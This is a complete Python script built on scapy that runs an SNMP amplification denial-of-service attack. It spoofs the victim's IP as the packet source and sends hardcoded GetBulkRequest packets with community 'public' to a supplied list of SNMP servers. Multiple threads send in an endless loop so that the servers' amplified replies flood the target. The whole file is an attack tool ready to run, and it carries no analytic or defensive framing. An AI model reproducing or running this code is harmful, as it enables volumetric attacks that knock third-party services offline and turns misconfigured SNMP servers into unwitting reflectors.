#!/usr/bin/env python
from scapy.all import *
import sys
import threading
import time



#packet sender
def deny():
	#Import globals to function
	global snmplist
	global currentserver
	global data
	global target
	snmpserver = snmplist[currentserver] #Get new server
	currentserver = currentserver + 1 #Increment for next 
	packet = IP(dst=snmpserver,src=target)/UDP(sport=161,dport=161)/Raw(load=data) #BUILD IT
	send(packet,loop=1) #SEND IT

#So I dont have to have the same stuff twice
def printhelp():
	print "SNMP Amplification DOS Attack"
	print "Usage snmpdos.py <target ip> <snmpserver list> <number of threads>"
	print "ex: ex: snmpdos.py 1.2.3.4 file.txt 10"
	print "SNMP serverlist file should contain one IP per line"
	print "MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS"
	exit(0)

if len(sys.argv) < 4:
	printhelp()
#Fetch Args
target = sys.argv[1]

#Help out idiots
if target in ("help","-h","h","?","--h","--help","/?"):
	printhelp()

snmpserverfile = sys.argv[2]
numberthreads = int(sys.argv[3])
#System for accepting bulk input
snmplist = []
currentserver = 0
with open(snmpserverfile) as f:
    snmplist = f.readlines()

#Make sure we dont out of bounds
if  numberthreads > int(len(snmplist)):
	print "Attack Aborted: More threads than servers"
	print "Next time dont create more threads than servers"
	exit(0)

#Magic Packet getBulkEequest
data = "\x30\x37\x02\x01" #snmp
data += "\x01" #v2
data += "\x04\x06\x70\x75\x62\x6c\x69\x63" #community=public
data += "\xa5\x2a\x02\x04\x06\x29\x07\x31\x02\x01\x00\x02\x01\x0a\x30\x1c\x30\x0b\x06\x07\x2b\x06\x01\x02\x01\x01\x01\x05\x00\x30\x0d\x06\x09\x2b\x06\x01\x02\x01\x01\x09\x01\x03\x05\x00" #getBulkRequest


#Hold our threads
threads = []
print "Starting to flood: "+ target + " using snmp list: " + snmpserverfile + " With " + str(numberthreads) + " threads"
print "Use CTRL+C to stop attack"

#Thread spawner
for n in range(numberthreads):
    thread = threading.Thread(target=deny)
    thread.daemon = True
    thread.start()

    threads.append(thread)

#In progress!
print "Sending..."

#Keep alive so ctrl+c still kills all them threads
while True:
	time.sleep(1)
